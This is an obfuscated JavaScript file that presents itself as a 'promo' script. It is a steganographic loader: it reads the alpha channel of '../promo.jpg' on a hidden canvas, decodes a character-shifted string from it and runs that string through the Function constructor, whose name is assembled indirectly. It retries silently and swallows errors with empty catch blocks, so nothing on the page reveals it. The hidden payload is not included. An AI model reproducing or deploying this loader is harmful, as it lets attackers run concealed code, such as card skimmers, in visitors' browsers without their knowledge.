var promo = function () {
        try {
            var t = function () {},
                r = {
                    Ae: function (t) {
                        if (isNaN(t) || !isFinite(t) || t % 1 || t < 2) return !1;
                        if (t % 2 === 0) return 2 === t;
                        if (t % 3 === 0) return 3 === t;
                        for (var r = Math.sqrt(t), e = 5; e <= r; e += 6) {
                            if (t % e === 0) return !1;
                            if (t % (e + 2) === 0) return !1
                        }
                        return !0
                    },
                    Hf: function (t) {
                        for (var r = "", e = -670, n = 0, i = 0; i < t.length; i++) n = t[i].charCodeAt() + e, r += String.fromCharCode(n);
                        return r
                    },
                    Yb: function (t) {
                        for (var e = t; !0; e += 1) if (r.Ae(e)) return e
                    },
                    Wk: function (t) {
                        var r = new Image;
                        for (r.src = t; r.hasOwnProperty("complete") && !r.complete;);
                        return r
                    }
                };
            return t.prototype.ET = {
                mp: 3,
                Tv: 1,
                At: 16,
                WC: function (t) {
                    return t + 1
                },
                TY: function (t, r, e) {
                    for (var n = !0, i = 0; i < 16 && n; i += 1) n = n && 255 === t[r + 4 * i];
                    return n
                }
            }, t.prototype.aq = function (t, r) {
                r = r || {};
                var e = this.ET,
                    n = r.width || t.width,
                    i = r.height || t.height,
                    o = r.mp || e.mp,
                    h = r.At || e.At;
                return o * n * i / h >> 0
            }, t.prototype.Vh = function (t, e) {
                if ("" === '../promo.jpg') return "";
                void 0 === t && (t = '../promo.jpg'), t.length && (t = r.Wk(t)), e = e || {};
                var n = this.ET,
                    i = e.mp || n.mp,
                    o = e.Tv || n.Tv,
                    h = e.At || n.At,
                    a = r.Yb(Math.pow(2, i)),
                    f = (e.WC || n.WC, e.TY || n.TY),
                    u = document.createElement("canvas"),
                    p = u.getContext("2d");
                if (u.style.display = "none", u.width = e.width || t.width, u.height = e.width || t.height, 0 === u.width || 0 === u.height) return "";
                e.height && e.width ? p.drawImage(t, 0, 0, e.width, e.height) : p.drawImage(t, 0, 0);
                var c = p.getImageData(0, 0, u.width, u.height),
                    d = c.data,
                    g = [];
                if (c.data.every(function (t) {
                    return 0 === t
                })) return "";
                var m, s;
                if (1 === o) for (m = 3, s = !1; !s && m < d.length && !s; m += 4) s = f(d, m, o), s || g.push(d[m] - (255 - a + 1));
                var v = "",
                    w = 0,
                    y = 0,
                    l = Math.pow(2, h) - 1;
                for (m = 0; m < g.length; m += 1) w += g[m] << y, y += i, y >= h && (v += String.fromCharCode(w & l), y %= h, w = g[m] >> i - y);
                return v.length < 13 ? "" : (0 !== w && (v += String.fromCharCode(w & l)), v)
            }, t.prototype.Po = 3, t.prototype.cs = 0, t.prototype.Rn = 5e3, t.prototype.dS = function () {
                try {
                    var e = t.prototype,
                        n = r.Hf(e.Vh());
                    if ("" === n) {
                        if (e.cs > e.Po) return;
                        return e.cs++, void setTimeout(e.dS, e.Rn)
                    }
                    document.defaultView[(typeof r.Ae).charAt(0).toUpperCase() + (typeof r.Ae).slice(1)](n)()
                } catch (t) {}
            }, (new t).dS
        } catch (t) {}
    }();
promo();
